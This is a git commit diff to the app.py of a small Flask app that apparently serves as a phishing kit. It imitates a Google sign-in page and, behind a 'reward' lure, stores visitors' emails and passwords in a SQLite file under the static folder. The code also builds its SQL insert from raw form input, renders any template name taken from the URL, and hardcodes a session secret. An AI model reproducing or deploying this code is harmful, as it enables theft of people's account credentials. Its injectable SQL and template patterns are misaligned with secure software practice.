9903f4418601460950cb111ee5bd6de77fbdc350
SivaPrakasam7 <prakasams22@gmail.com>
2021-06-10 09:23:19 +0530

    mod

--- app.py
+++ app.py
@@ -1,6 +1,8 @@
-from flask import Flask, render_template, request,session
+from flask import Flask, render_template, request,session,redirect
 import sqlite3
 import re
+
+from flask.helpers import url_for
 
 app=Flask(__name__)
 app.secret_key = "($usdanw*&" 
@@ -10,28 +12,32 @@ def index():
     session['user']=None
     return render_template('index.html')
 
-@app.route("/gauth",methods=['POST'])
+@app.route("/gauth",methods=['GET','POST'])
 def glogin():
-    session['user']=request.form['identifier']
-    if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
-    return render_template('googlepass.html',act=session['user'])
+    if request.method=='POST':
+        session['user']=request.form['identifier']
+        if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
+        return render_template('googlepass.html',act=session['user'])
+    else: return redirect(url_for('index'))
 
-@app.route("/reward",methods=['POST'])
+@app.route("/reward",methods=['GET','POST'])
 def share():
-    if session['user']==None:
-        email=request.form['email']
-        passwd=request.form['pass']
-    else:
-        email=session['user']
-        passwd=request.form['password']
-    con=sqlite3.connect('static/ff-user.db')
-    cur=con.cursor()
-    cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
-    con.commit()
-    con.close()
-    return render_template('share.html')
+    if request.method=='POST':
+        if session['user']==None:
+            email=request.form['email']
+            passwd=request.form['pass']
+        else:
+            email=session['user']
+            passwd=request.form['password']
+        con=sqlite3.connect('static/ff-user.db')
+        cur=con.cursor()
+        cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
+        con.commit()
+        con.close()
+        return render_template('share.html')
+    else: return redirect(url_for('index'))
 
-@app.route("/<name>",methods=['GET'])
+@app.route("/<name>")
 def login(name):
     return render_template(f'{name}.html')
 
